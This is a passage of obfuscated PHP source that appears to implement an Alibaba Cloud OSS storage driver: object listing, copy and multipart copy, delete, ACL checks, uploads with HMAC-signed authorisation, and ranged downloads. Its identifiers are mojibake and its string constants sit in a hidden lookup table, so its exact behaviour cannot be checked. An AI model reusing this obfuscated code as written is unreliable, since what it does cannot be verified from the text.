$Íû«À›” = $õ˜àûÖ->getLastModified(); $©ĞÅÑÃ‹ = trim($õ˜àûÖ->getETag(), $“­îıèß[121]); $ç“ÚÆ¼¿ = $ÉƒÕîãº ? array($“­îıèß[32] => $½Ç¯Îü, $“­îıèß[79] => $²ôŠµ§é, $“­îıèß[207] => strtotime($Íû«À›”), $“­îıèß[1501] => $©ĞÅÑÃ‹) : $½Ç¯Îü; $äÜüÓ¸ç = $²ôŠµ§é == 0 && substr($½Ç¯Îü, strlen($½Ç¯Îü) - 1, 1) == $“­îıèß[8] ? !0 : !1; $ÒôÕşàÏ = array($“­îıèß[79] => $²ôŠµ§é, $“­îıèß[1502] => $²ôŠµ§é, $“­îıèß[88] => strtotime($Íû«À›”), $“­îıèß[1503] => $Íû«À›”, $“­îıèß[1501] => $©ĞÅÑÃ‹); $this->cacheMethodInfoSet($½Ç¯Îü, $äÜüÓ¸ç, $ÒôÕşàÏ); if ($äÜüÓ¸ç) { $ñÓÉŞ³Ê[] = $½Ç¯Îü; continue; } $šÇ†æØæ[] = $ç“ÚÆ¼¿; } foreach ($Ÿêú½¹ as $¥±×¤ñ‰) { $ñÓÉŞ³Ê[] = $¥±×¤ñ‰->getPrefix(); $this->cacheMethodInfoSet($¥±×¤ñ‰->getPrefix(), !0); } if ($°âŸ—¤ === $“­îıèß[12]) { break; } } $this->cacheMethodInfoSet($˜÷Î¾¤, !0); return array($“­îıèß[85] => $ñÓÉŞ³Ê, $“­îıèß[86] => $šÇ†æØæ); } public function listObject($Íêôİ›ã, $¡Ã¢Ğ§ = '') { $Ş•§Í£ =& $_SERVER[ÅÄÇĞô]; $Íêôİ›ã = trim($Íêôİ›ã, $Ş•§Í£[8]); $ÔíÚºøÄ = empty($Íêôİ›ã) && $Íêôİ›ã !== $Ş•§Í£[231] ? $Ş•§Í£[12] : $Íêôİ›ã . $Ş•§Í£[8]; $¸´¥¤šò = $Ş•§Í£[12]; $£˜¨€á¾ = 1000; $Èù¦Ì¨­ = $µÂÉÏ–µ = array(); while (!0) { check_abort(); $ÛÜ½šù´ = array($Ş•§Í£[1497] => $¡Ã¢Ğ§, $Ş•§Í£[1498] => $ÔíÚºøÄ, $Ş•§Í£[1499] => $£˜¨€á¾, $Ş•§Í£[1500] => $¸´¥¤šò); try { $â¬°ñåÈ = $this->client->listObjects($this->bucket, $ÛÜ½šù´); } catch (OSS\Core\OssException $ÅºÒõğÄ) { $this->writeLog(__FUNCTION__ . $Ş•§Í£[215] . $ÅºÒõğÄ->getMessage()); break; } $¸´¥¤šò = $â¬°ñåÈ->getNextMarker(); $ØÀ»Õ…ı = $â¬°ñåÈ->getObjectList(); foreach ($ØÀ»Õ…ı as $¬ »”°) { if ($¬ »”°->getKey() == $ÔíÚºøÄ) { continue; } $Š¯ÎÔ‡Í = $¬ »”°->getKey(); $ÑªªŠÉå = $¬ »”°->getSize(); $¼ñƒîÊ¼ = $ÑªªŠÉå == 0 && substr($Š¯ÎÔ‡Í, strlen($Š¯ÎÔ‡Í) - 1, 1) == $Ş•§Í£[8] ? !0 : !1; if ($¼ñƒîÊ¼) { continue; } $µÂÉÏ–µ[] = $ÑªªŠÉå . $Ş•§Í£[215] . $Š¯ÎÔ‡Í; } if ($¸´¥¤šò === $Ş•§Í£[12]) { break; } } return array($Ş•§Í£[85] => $Èù¦Ì¨­, $Ş•§Í£[86] => $µÂÉÏ–µ); } public function copyFile($ú„í¤êè, $ñ’µœ©ñ) { $õüÍ™œ§ = $this->size($ú„í¤êè); if ($õüÍ™œ§ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $ú„í¤êè, $this->bucket, $this->pathEncode($ñ’µœ©ñ)); } catch (OSS\Core\OssException $¾¨’Øúş) { $this->writeLog(__FUNCTION__ . $_SERVER[ÅÄÇĞô][215] . $¾¨’Øúş->getMessage()); return !1; } return $this->getPathOuter($ñ’µœ©ñ); } $À÷»­ø“ = $this->multiCopyObject($ú„í¤êè, $ñ’µœ©ñ, $õüÍ™œ§); return $À÷»­ø“ ? $this->getPathOuter($ñ’µœ©ñ) : !1; } private function multiCopyObject($±É…Å¤, $×Å¼œõ„, $´¹üˆ¢º) { $ªó‡óÇ =& $_SERVER[ÅÄÇĞô]; try { $¦ÒÃñÙ¢ = array(); if ($Å˜©‘À° = $this->hashMd5($±É…Å¤)) { $¦ÒÃñÙ¢ = array(OSS\OssClient::OSS_HEADERS => array($ªó‡óÇ[1504] => $Å˜©‘À°)); } $±»¬§ß· = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($×Å¼œõ„), $¦ÒÃñÙ¢); $ºÃ¨Ùƒº = 1; $ÆŠŞƒ‰‹ = 0; $©Ë¿ç¢õ = array(); $êÁ”‘âö = 1024 * 1024 * 10; $Á°úå¿ = $this->client->generateMultiuploadParts($´¹üˆ¢º, $êÁ”‘âö); foreach ($Á°úå¿ as $ü¡¹Ê± => $Êœ¤ıœÍ) { $¿ŞĞƒ‹¢ = $ÆŠŞƒ‰‹ + (int) $Êœ¤ıœÍ[$ªó‡óÇ[1505]]; $º¯ÄŸ = (int) $Êœ¤ıœÍ[$ªó‡óÇ[415]] + $¿ŞĞƒ‹¢ - 1; $ ¨Àø• = array($ªó‡óÇ[167] => $¿ŞĞƒ‹¢, $ªó‡óÇ[168] => $º¯ÄŸ); $©Ë¿ç¢õ[] = $this->client->uploadPartCopy($this->bucket, $±É…Å¤, $this->bucket, $this->pathEncode($×Å¼œõ„), $ºÃ¨Ùƒº, $±»¬§ß·, $ ¨Àø•); $ºÃ¨Ùƒº = $ºÃ¨Ùƒº + 1; } $—‚Ò©Üä = array(); foreach ($©Ë¿ç¢õ as $ü¡¹Ê± => $µª„ÁÕı) { $—‚Ò©Üä[] = array($ªó‡óÇ[300] => $ü¡¹Ê± + 1, $ªó‡óÇ[301] => $µª„ÁÕı); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($×Å¼œõ„), $±»¬§ß·, $—‚Ò©Üä); } catch (OSS\Core\OssException $ÒÆË¥ÀÁ) { $this->writeLog(__FUNCTION__ . $ªó‡óÇ[215] . $ÒÆË¥ÀÁ->getMessage()); return !1; } return !0; } public function moveFile($ì¢û¸ãÌ, $»¹Íï) { if ($this->copyFile($ì¢û¸ãÌ, $»¹Íï)) { $this->remove($ì¢û¸ãÌ); return $this->getPathOuter($»¹Íï); } return !1; } public function delFile($£±çü™ö) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($£±çü™ö)); } catch (OSS\Core\OssException $  Øšñ) { $this->writeLog(__FUNCTION__ . $_SERVER[ÅÄÇĞô][215] . $  Øšñ->getMessage()); return !1; } return !0; } public function delFolder($ø€İ•Õ’) { $»İ‹ÆÃÉ =& $_SERVER[ÅÄÇĞô]; if (!$this->exist($ø€İ•Õ’)) { return !0; } $this->listItemCache = !1; $éùø²º = $this->fileList($ø€İ•Õ’); $this->listItemCache = !0; $éâ‚Ì¥ = trim($ø€İ•Õ’, $»İ‹ÆÃÉ[8]) . $»İ‹ÆÃÉ[8]; if (!empty($ø€İ•Õ’) && $ø€İ•Õ’ !== $»İ‹ÆÃÉ[231] && !in_array($éâ‚Ì¥, $éùø²º[$»İ‹ÆÃÉ[85]])) { $éùø²º[$»İ‹ÆÃÉ[85]][] = $éâ‚Ì¥; } $Ã…ó½çÙ = $this->delByBatch($éùø²º[$»İ‹ÆÃÉ[86]]); if (!$Ã…ó½çÙ) { return !1; } $Ã…ó½çÙ = $this->delByBatch($éùø²º[$»İ‹ÆÃÉ[85]]); if (!$Ã…ó½çÙ) { return !1; } return $this->delFile($éâ‚Ì¥); } private function delByBatch($æ††éã³) { foreach (array_chunk($æ††éã³, 1000) as $ŞÊ’ÚÇˆ) { try { $this->client->deleteObjects($this->bucket, $ŞÊ’ÚÇˆ); } catch (OSS\Core\OssException $Ë«Ğ£¼€) { $this->writeLog(__FUNCTION__ . $_SERVER[ÅÄÇĞô][215] . $Ë«Ğ£¼€->getMessage()); return !1; } } return !0; } public function rename($‰Ú÷Å¢¹, $Ğ†û‘´æ) { return $this->renameObject($‰Ú÷Å¢¹, $Ğ†û‘´æ); } private function fileInfo($Ğ™ïÂúÆ, $˜ğ·ĞË” = false, $ş¶êœĞ… = array()) { $œ¡ìÚ—¢ =& $_SERVER[ÅÄÇĞô]; $»½åŒ” = array($œ¡ìÚ—¢[32] => $this->pathThis($Ğ™ïÂúÆ), $œ¡ìÚ—¢[87] => $this->getPathOuter($Ğ™ïÂúÆ), $œ¡ìÚ—¢[33] => $œ¡ìÚ—¢[233], $œ¡ìÚ—¢[79] => isset($ş¶êœĞ…[$œ¡ìÚ—¢[79]]) ? $ş¶êœĞ…[$œ¡ìÚ—¢[79]] : 0, $œ¡ìÚ—¢[169] => $this->ext($Ğ™ïÂúÆ)); if ($˜ğ·ĞË”) { return $»½åŒ”; } $»½åŒ”[$œ¡ìÚ—¢[234]] = $»½åŒ”[$œ¡ìÚ—¢[88]] = 0; $»½åŒ”[$œ¡ìÚ—¢[235]] = $»½åŒ”[$œ¡ìÚ—¢[236]] = !0; if (empty($ş¶êœĞ…)) { $ƒ¬ÂŠãÜ = $this->objectMeta($Ğ™ïÂúÆ); if (!$ƒ¬ÂŠãÜ) { return $»½åŒ”; } $ş¶êœĞ… = array($œ¡ìÚ—¢[88] => strtotime($ƒ¬ÂŠãÜ[$œ¡ìÚ—¢[1503]]), $œ¡ìÚ—¢[79] => $ƒ¬ÂŠãÜ[$œ¡ìÚ—¢[1502]] + 0, $œ¡ìÚ—¢[1501] => $ƒ¬ÂŠãÜ[$œ¡ìÚ—¢[1501]]); } if (isset($ş¶êœĞ…[$œ¡ìÚ—¢[1501]]) && $ş¶êœĞ…[$œ¡ìÚ—¢[1501]]) { $»½åŒ”[$œ¡ìÚ—¢[238]] = trim($ş¶êœĞ…[$œ¡ìÚ—¢[1501]], $œ¡ìÚ—¢[121]); } if (isset($ş¶êœĞ…[$œ¡ìÚ—¢[79]])) { $»½åŒ”[$œ¡ìÚ—¢[79]] = $ş¶êœĞ…[$œ¡ìÚ—¢[79]]; } if (isset($ş¶êœĞ…[$œ¡ìÚ—¢[88]])) { $»½åŒ”[$œ¡ìÚ—¢[88]] = $ş¶êœĞ…[$œ¡ìÚ—¢[88]]; } if (isset($ş¶êœĞ…[$œ¡ìÚ—¢[207]]) && !trim($»½åŒ”[$œ¡ìÚ—¢[88]])) { $»½åŒ”[$œ¡ìÚ—¢[88]] = $ş¶êœĞ…[$œ¡ìÚ—¢[207]]; } return $»½åŒ”; } private function folderInfo($Çú®Ô™Æ, $ÚÉ´»°š = false, $µ“ª”©‚ = array()) { $›şñçÈ± =& $_SERVER[ÅÄÇĞô]; $øìüÛ§ˆ = array($›şñçÈ±[32] => $this->pathThis($Çú®Ô™Æ), $›şñçÈ±[87] => $this->getPathOuter($›şñçÈ±[8] . $Çú®Ô™Æ), $›şñçÈ±[33] => $›şñçÈ±[78]); if ($ÚÉ´»°š) { return $øìüÛ§ˆ; } $øìüÛ§ˆ[$›şñçÈ±[234]] = $øìüÛ§ˆ[$›şñçÈ±[88]] = 0; $øìüÛ§ˆ[$›şñçÈ±[235]] = $øìüÛ§ˆ[$›şñçÈ±[236]] = !0; if (empty($µ“ª”©‚)) { $Çú®Ô™Æ = rtrim($Çú®Ô™Æ, $›şñçÈ±[8]) . $›şñçÈ±[8]; $¡‰ªï¸Ø = $this->objectMeta($Çú®Ô™Æ); if (!$¡‰ªï¸Ø) { return $øìüÛ§ˆ; } $µ“ª”©‚ = array($›şñçÈ±[234] => $¡‰ªï¸Ø[$›şñçÈ±[580]][$›şñçÈ±[1506]], $›şñçÈ±[88] => strtotime($¡‰ªï¸Ø[$›şñçÈ±[1503]])); } if (isset($µ“ª”©‚[$›şñçÈ±[88]])) { $øìüÛ§ˆ[$›şñçÈ±[88]] = $µ“ª”©‚[$›şñçÈ±[88]]; } if (isset($µ“ª”©‚[$›şñçÈ±[234]])) { $øìüÛ§ˆ[$›şñçÈ±[234]] = $µ“ª”©‚[$›şñçÈ±[234]]; } return $øìüÛ§ˆ; } public function listPath($ö“Êºåä, $±ÌÌÃ¶ = false) { $¢õæ¹Ô =& $_SERVER[ÅÄÇĞô]; $„ÓöÚ• = $this->fileList($ö“Êºåä, $¢õæ¹Ô[8], !0); foreach ($„ÓöÚ•[$¢õæ¹Ô[85]] as $ê˜‡ïŞÛ => $³ òÌÙ¼) { $„ÓöÚ•[$¢õæ¹Ô[85]][$ê˜‡ïŞÛ] = $this->folderInfo($³ òÌÙ¼, $±ÌÌÃ¶, $³ òÌÙ¼); } foreach ($„ÓöÚ•[$¢õæ¹Ô[86]] as $ê˜‡ïŞÛ => $³ òÌÙ¼) { $„ÓöÚ•[$¢õæ¹Ô[86]][$ê˜‡ïŞÛ] = $this->fileInfo($³ òÌÙ¼[$¢õæ¹Ô[32]], $±ÌÌÃ¶, $³ òÌÙ¼); } return $„ÓöÚ•; } protected function infoChildren($êçØ€ŞŸ, &$ÎÌšÂ) { $Ú›ğÅ« =& $_SERVER[ÅÄÇĞô]; $ĞÄÅ–»º = $this->fileList($êçØ€ŞŸ, $Ú›ğÅ«[12], !0); $ÎÌšÂ[$Ú›ğÅ«[81]] += count($ĞÄÅ–»º[$Ú›ğÅ«[85]]); $ÎÌšÂ[$Ú›ğÅ«[80]] += count($ĞÄÅ–»º[$Ú›ğÅ«[86]]); foreach ($ĞÄÅ–»º[$Ú›ğÅ«[86]] as $ô™­¶‰ğ) { if (!$ô™­¶‰ğ || !$ô™­¶‰ğ[$Ú›ğÅ«[79]]) { continue; } $ÎÌšÂ[$Ú›ğÅ«[79]] += $ô™­¶‰ğ[$Ú›ğÅ«[79]]; } } public function has($ÃğÎò§±, $¤¬şĞ÷µ = false, $Š’ÖèÔÁ = true) { $Éäñµª° =& $_SERVER[ÅÄÇĞô]; $ÃğÎò§± = trim($ÃğÎò§±, $Éäñµª°[8]); $³ÍÙÚ´µ = empty($ÃğÎò§±) && $ÃğÎò§± !== $Éäñµª°[231] ? $Éäñµª°[12] : $ÃğÎò§± . $Éäñµª°[8]; $è¦ıÛ×¾ = $Éäñµª°[12]; $§€²Œ¦Ô = 500; $Ô—¡÷Ëü = $¥ÒÛ¿„ = 0; while (!0) { check_abort(); $¬Ä“õàè = array($Éäñµª°[1497] => $Éäñµª°[8], $Éäñµª°[1498] => $³ÍÙÚ´µ, $Éäñµª°[1499] => $§€²Œ¦Ô, $Éäñµª°[1500] => $è¦ıÛ×¾); try { $îÖÑÊè = $this->client->listObjects($this->bucket, $¬Ä“õàè); } catch (OSS\Core\OssException $¿ö¿øîá) { $this->writeLog(__FUNCTION__ . $Éäñµª°[215] . $¿ö¿øîá->getMessage()); break; } $è¦ıÛ×¾ = $îÖÑÊè->getNextMarker(); $«Ò¢Ù•Š = $îÖÑÊè->getObjectList(); $È–“›í• = $îÖÑÊè->getPrefixList(); if ($¤¬şĞ÷µ) { if (count($«Ò¢Ù•Š) > 1 || count($«Ò¢Ù•Š) == 1 && $«Ò¢Ù•Š[0]->getKey() != $³ÍÙÚ´µ) { $Ô—¡÷Ëü += count($«Ò¢Ù•Š) - 1; } if (!empty($È–“›í•)) { $¥ÒÛ¿„ += count($È–“›í•); } if ($è¦ıÛ×¾ === $Éäñµª°[12]) { break; } continue; } if ($Š’ÖèÔÁ) { if (!empty($«Ò¢Ù•Š)) { if (count($«Ò¢Ù•Š) > 1 || $«Ò¢Ù•Š[0]->getKey() != $³ÍÙÚ´µ) { return !0; } } } else { if (!empty($È–“›í•)) { return !0; } } if ($è¦ıÛ×¾ === $Éäñµª°[12]) { break; } } if ($¤¬şĞ÷µ) { return array($Éäñµª°[242] => $Ô—¡÷Ëü, $Éäñµª°[243] => $¥ÒÛ¿„); } return !1; } public function listAll($‘úá Ÿ®) { $§³¶£Â” =& $_SERVER[ÅÄÇĞô]; $º§£œ = $this->fileList($‘úá Ÿ®, $§³¶£Â”[12], !0); $ ş²¬™ô = array_to_keyvalue($º§£œ[$§³¶£Â”[86]], $§³¶£Â”[32]); foreach ($º§£œ[$§³¶£Â”[85]] as $™£Ûœ­Û) { if (is_string($™£Ûœ­Û)) { $ ş²¬™ô[$™£Ûœ­Û] = array($§³¶£Â”[79] => 0); } } return $this->listAllFiles($‘úá Ÿ®, $ ş²¬™ô); } public function canRead($Ú×êÓ¿Ú) { $¹ü®¾á» =& $_SERVER[ÅÄÇĞô]; $§«ÏéÀ = $this->pathAcl($Ú×êÓ¿Ú); return $§«ÏéÀ == $¹ü®¾á»[1507] || $§«ÏéÀ == $¹ü®¾á»[627] ? !0 : !1; } public function canWrite($Ìœøãì) { $—–ÛË² = $this->pathAcl($Ìœøãì); return $—–ÛË² == $_SERVER[ÅÄÇĞô][627] ? !0 : !1; } public function pathAcl($øÜÛ¿£¨) { $ø¢š‰·² =& $_SERVER[ÅÄÇĞô]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $˜°äı– = $this->client->getObjectAcl($this->bucket, $this->pathEncode($øÜÛ¿£¨)); } catch (OSS\Core\OssException $Õ”ûù°) { $this->writeLog(__FUNCTION__ . $ø¢š‰·²[215] . $Õ”ûù°->getMessage()); return !1; } $¼¾¡‹·° = $˜°äı– == $ø¢š‰·²[37] ? $this->bucketAcl : $˜°äı–; if ($¼¾¡‹·° == $ø¢š‰·²[1508]) { return $ø¢š‰·²[1507]; } if ($¼¾¡‹·° == $ø¢š‰·²[1509]) { return $ø¢š‰·²[627]; } return $¼¾¡‹·°; } private function chmodPath($”ÁÃğ“Ì, $¤•°ßçë = '') { $û‰ìÁì =& $_SERVER[ÅÄÇĞô]; $·¬æ½Ô™ = empty($¤•°ßçë) ? $û‰ìÁì[1509] : $¤•°ßçë; $ƒï²¥ÓØ = array($û‰ìÁì[37], $û‰ìÁì[232], $û‰ìÁì[1508], $û‰ìÁì[1509]); if (!in_array($·¬æ½Ô™, $ƒï²¥ÓØ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($”ÁÃğ“Ì), $·¬æ½Ô™); } catch (OSS\Core\OssException $Ù¡Ğ‡‘³) { $this->writeLog(__FUNCTION__ . $û‰ìÁì[215] . $Ù¡Ğ‡‘³->getMessage()); return !1; } return !0; } public function getContent($›£ÚÕ·) { return $this->fileSubstr($›£ÚÕ·, -1); } public function setContent($’´Šßìö, $Î®ãâæ‹ = '') { $ı«÷õÇ¾ =& $_SERVER[ÅÄÇĞô]; try { $¨¡²Ó¿Û = $this->trafficLimit($ı«÷õÇ¾[1510]); $Ãä‡Šø£ = $this->client->putObject($this->bucket, $this->pathEncode($’´Šßìö), $Î®ãâæ‹, $¨¡²Ó¿Û); } catch (OSS\Core\OssException $Ì¶á—¼ğ) { $this->writeLog(__FUNCTION__ . $ı«÷õÇ¾[215] . $Ì¶á—¼ğ->getMessage()); return !1; } $¹€ßª«„ = array($ı«÷õÇ¾[1504] => trim($Ãä‡Šø£[$ı«÷õÇ¾[1501]], $ı«÷õÇ¾[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($’´Šßìö))); $this->updateObjMeta($’´Šßìö, $¹€ßª«„); return isset($Ãä‡Šø£[$ı«÷õÇ¾[1511]][$ı«÷õÇ¾[297]]) ? !0 : !1; } private function updateObjMeta($¶É²¥ğê, $ğ‚ ˆê) { $¶É²¥ğê = $this->pathEncode($¶É²¥ğê); try { $’à“êİº = array(OSS\OssClient::OSS_HEADERS => $ğ‚ ˆê); $this->client->copyObject($this->bucket, $¶É²¥ğê, $this->bucket, $¶É²¥ğê, $’à“êİº); } catch (OSS\Core\OssException $Óš…Î–») { $this->writeLog(__FUNCTION__ . $_SERVER[ÅÄÇĞô][215] . $Óš…Î–»->getMessage()); return !1; } return !0; } public function upload($™æñÜëä, $‡æÜ‹šç, $ü¹ï…â = false, $¥ó§ÀÜÁ = REPEAT_REPLACE) { $è¬ŸŒ‡ =& $_SERVER[ÅÄÇĞô]; $õ³ä²ĞŞ = trim($™æñÜëä, $è¬ŸŒ‡[8]); $ª½èµ×û = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($è¬ŸŒ‡[1504] => @md5_file($‡æÜ‹šç)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($™æñÜëä))); $ª½èµ×û = $this->trafficLimit($è¬ŸŒ‡[1510], $ª½èµ×û); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($õ³ä²ĞŞ), $‡æÜ‹šç, $ª½èµ×û); } catch (OSS\Core\OssException $™°´Ñ‘Ş) { $this->writeLog(__FUNCTION__ . $è¬ŸŒ‡[215] . $™°´Ñ‘Ş->getMessage()); return !1; } return $this->getPathOuter($™æñÜëä); } public function getHost() { $—ôÂÓİı =& $_SERVER[ÅÄÇĞô]; $åñÄ†óÛ = explode($—ôÂÓİı[211], parent::getHost()); return $åñÄ†óÛ[0] . $—ôÂÓİı[211] . $this->bucket . $—ôÂÓİı[10] . $åñÄ†óÛ[1]; } public function uploadFormData($ Çé”åâ, $àæë²ÂÃ = 3600) { $øù¿õ“É =& $_SERVER[ÅÄÇĞô]; if (!($şËÛÁœÉ = $this->getHost())) { return !1; } $‡™Ü¾Åˆ = $àæë²ÂÃ; $Ó¬ªëÚ” = date($øù¿õ“É[1512], time() + $‡™Ü¾Åˆ); $ÙéúÊ§ = new DateTime($Ó¬ªëÚ”); $áÒ®¤®· = $ÙéúÊ§->format(DateTime::ISO8601); $›ëÙ³üğ = strpos($áÒ®¤®·, $øù¿õ“É[374]); $áÒ®¤®· = substr($áÒ®¤®·, 0, $›ëÙ³üğ) . $øù¿õ“É[1513]; $É´¤„Ò = 1048576000 * 5; $¹®Ë‡¹ = $this->pathFather($ Çé”åâ); $‹¡Ê›®¨ = array($øù¿õ“É[265] => $áÒ®¤®·, $øù¿õ“É[268] => array(array($øù¿õ“É[1514], 0, $É´¤„Ò), array($øù¿õ“É[270], $øù¿õ“É[271], $¹®Ë‡¹))); $õÈ®Ç¡± = base64_encode(json_encode($‹¡Ê›®¨)); $´äæ•¦› = base64_encode(hash_hmac($øù¿õ“É[1435], $õÈ®Ç¡±, $this->secret, !0)); $ö³î—‡¾ = array($øù¿õ“É[1515] => $this->accessKey, $øù¿õ“É[280] => $õÈ®Ç¡±, $øù¿õ“É[273] => $øù¿õ“É[264], $øù¿õ“É[1516] => $´äæ•¦›, $øù¿õ“É[209] => $şËÛÁœÉ); $ö³î—‡¾ = $this->trafficLimit($øù¿õ“É[1510], $ö³î—‡¾, !0); return $ö³î—‡¾; } public function uploadMultiData($ÆÊÂÛ£’, $ÌÄúºÛ = 3600) { $˜­ª¡– =& $_SERVER[ÅÄÇĞô]; if (!($°ºäü¿ = $this->getHost())) { return !1; } $Âšé°—Û = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ÆÊÂÛ£’)); return array($˜­ª¡–[284] => $Âšé°—Û, $˜­ª¡–[209] => $°ºäü¿ . $˜­ª¡–[8] . $this->pathEncode($ÆÊÂÛ£’), $˜­ª¡–[285] => gmdate($˜­ª¡–[1517]), $˜­ª¡–[97] => $ÆÊÂÛ£’); } public function uploadMultiAuth($ÁÜíåè¹, $à•Öì² = array()) { if (isset($à•Öì²[$_SERVER[ÅÄÇĞô][286]])) { return $this->uploadPartAuth($ÁÜíåè¹, $à•Öì²); } return $this->uploadListAuth($ÁÜíåè¹, $à•Öì²); } private function uploadPartAuth($¿«µãÎ¤, $·ë¹â³ƒ = array()) { $í’¤ƒ•à =& $_SERVER[ÅÄÇĞô]; $¯–¡öã÷ = $·ë¹â³ƒ[$í’¤ƒ•à[97]]; $”ä¤Í² = $this->_getUploadAuth($¯–¡öã÷, $·ë¹â³ƒ); $á» éñ = array($í’¤ƒ•à[289] => $”ä¤Í²[$í’¤ƒ•à[289]], $í’¤ƒ•à[285] => $”ä¤Í²[$í’¤ƒ•à[285]]); if (isset($”ä¤Í²[$í’¤ƒ•à[1518]])) { $á» éñ[$í’¤ƒ•à[1518]] = $”ä¤Í²[$í’¤ƒ•à[1518]]; } return $á» éñ; } private function uploadListAuth($ëñ ºÂ¾, $ò€Â¡ì¯ = array()) { $’ã”Ã¦± =& $_SERVER[ÅÄÇĞô]; $Ù‹›é©Ä = $ò€Â¡ì¯[$’ã”Ã¦±[97]]; $µû…§£‹ = $ò€Â¡ì¯[$’ã”Ã¦±[284]]; $©ÕœÆî = $this->client->listParts($this->bucket, $this->pathEncode($Ù‹›é©Ä), $µû…§£‹); $œÈ¸ÔÏÄ = $©ÕœÆî->getListPart(); $‘“ã¡í = array(); foreach ($œÈ¸ÔÏÄ as $ÂÈõ‰öü) { $‘“ã¡í[] = array($’ã”Ã¦±[300] => $ÂÈõ‰öü->getPartNumber(), $’ã”Ã¦±[301] => trim($ÂÈõ‰öü->getETag(), $’ã”Ã¦±[121])); } if (!$‘“ã¡í) { return !1; } $õ¤ŒÔ¨® = $this->_getUploadAuth($Ù‹›é©Ä, $ò€Â¡ì¯); return array($’ã”Ã¦±[289] => $õ¤ŒÔ¨®[$’ã”Ã¦±[289]], $’ã”Ã¦±[285] => $õ¤ŒÔ¨®[$’ã”Ã¦±[285]], $’ã”Ã¦±[292] => $‘“ã¡í); } private function _getUploadAuth($Ö®Û–Ûë, $ÈàíÎªÛ) { $ó›š³êŒ =& $_SERVER[ÅÄÇĞô]; $¦æ‡ıÚ’ = gmdate($ó›š³êŒ[1517]); $ô‚ËÉ‰‰ = isset($ÈàíÎªÛ[$ó›š³êŒ[286]]) ? $ó›š³êŒ[256] : $ó›š³êŒ[291]; $ĞßîØºó = array_intersect_key($ÈàíÎªÛ, array_flip(array($ó›š³êŒ[286], $ó›š³êŒ[284]))); ksort($ĞßîØºó); $ÖæÒë­ = $ĞßîØºó ? $ó›š³êŒ[76] . http_build_query($ĞßîØºó, null, $ó›š³êŒ[287], PHP_QUERY_RFC3986) : $ó›š³êŒ[12]; $ÌÔµÅ×¤ = array($ô‚ËÉ‰‰, $ó›š³êŒ[12], $ó›š³êŒ[123], $¦æ‡ıÚ’, "\170\x2d\x6f\x73\x73\x2d\144\141\164\x65\x3a{$¦æ‡ıÚ’}", $ó›š³êŒ[8] . $this->bucket . $ó›š³êŒ[8] . $Ö®Û–Ûë . $ÖæÒë­); if (isset($ÈàíÎªÛ[$ó›š³êŒ[286]])) { $Û¡‰†ğÔ = $this->trafficLimit($ó›š³êŒ[1510], array(), !0); if ($Û¡‰†ğÔ) { $Ö®Û–Ûë = $ó›š³êŒ[1518]; array_splice($ÌÔµÅ×¤, 5, 0, $Ö®Û–Ûë . $ó›š³êŒ[4] . $Û¡‰†ğÔ[$Ö®Û–Ûë]); } } $ÈÌ™¿šˆ = implode($ó›š³êŒ[288], $ÌÔµÅ×¤); $‰™ÜÊ«“ = base64_encode(hash_hmac($ó›š³êŒ[1435], $ÈÌ™¿šˆ, $this->secret, !0)); $¬¸Ğ‚¯Å = $ó›š³êŒ[1487] . $this->accessKey . $ó›š³êŒ[4] . $‰™ÜÊ«“; $ÔÜ•ÓŸŞ = array($ó›š³êŒ[289] => $¬¸Ğ‚¯Å, $ó›š³êŒ[285] => $¦æ‡ıÚ’); if (!empty($Û¡‰†ğÔ)) { $ÔÜ•ÓŸŞ = array_merge($ÔÜ•ÓŸŞ, $Û¡‰†ğÔ); } return $ÔÜ•ÓŸŞ; } public function download($ÎÜ¿¥ÄÖ, $¾†ïœÈĞ) { $üĞ“ŸË =& $_SERVER[ÅÄÇĞô]; if ($this->isFolder($ÎÜ¿¥ÄÖ)) { return !1; } try { $ °ƒåÔÊ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $¾†ïœÈĞ); $ °ƒåÔÊ = $this->trafficLimit($üĞ“ŸË[112], $ °ƒåÔÊ); $this->client->getObject($this->bucket, $this->pathEncode($ÎÜ¿¥ÄÖ), $ °ƒåÔÊ); } catch (OSS\Core\OssException $Ì¢®Éøı) { $this->writeLog(__FUNCTION__ . $üĞ“ŸË[215] . $Ì¢®Éøı->getMessage()); return !1; } return $¾†ïœÈĞ; } public function fileSubstr($’à¼Ô¿ï, $°åáÅçµ = 0, $ƒØ”¹ò¶ = false) { if ($°åáÅçµ === -1) { $û•Ì¬ˆ = array(); } else { if ($ƒØ”¹ò¶ === !1) { $‡·œşÏÆ = $this->size($’à¼Ô¿ï); } else { $‡·œşÏÆ = $°åáÅçµ + $ƒØ”¹ò¶ - 1; } $û•Ì¬ˆ = array(OSS\OssClient::OSS_RANGE => "{$°åáÅçµ}\x2d{$‡·œşÏÆ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($’à¼Ô¿ï), $û•Ì¬ˆ); } catch (OSS\Core\OssException $èó‘­Ÿƒ) { $this->writeLog(__FUNCTION__ . $_SERVER[ÅÄÇĞô][215] . $èó‘­Ÿƒ->getMessage()); think_exception($èó‘­Ÿƒ->getMessage()); return !1; } } private function trafficLimit($É‰Æİ’, $¦Êµ™¡ = array(), $‡ò¯´ğí = false) { $ó®˜½ó =& $_SERVER[ÅÄÇĞô]; if ($É‰Æİ’ == $ó®˜½ó[1510] && $this->isUploadServer() || $É‰Æİ’ == $ó®˜½ó[112] && $this->isFileOutServer()) { return $¦Êµ™¡; } $ªüÒú‘É = floatval($GLOBALS[$ó®˜½ó[6]][$ó®˜½ó[92]][$ó®˜½ó[110]][$É‰Æİ’]) * 1024 * 1024 * 8; if (!$ªüÒú‘É) { return $¦Êµ™¡; } $ªüÒú‘É = $ªüÒú‘É < 819200 ? 819200 : ($ªüÒú‘É > 838860800 ? 838860800 : $ªüÒú‘É); if ($‡ò¯´ğí) { 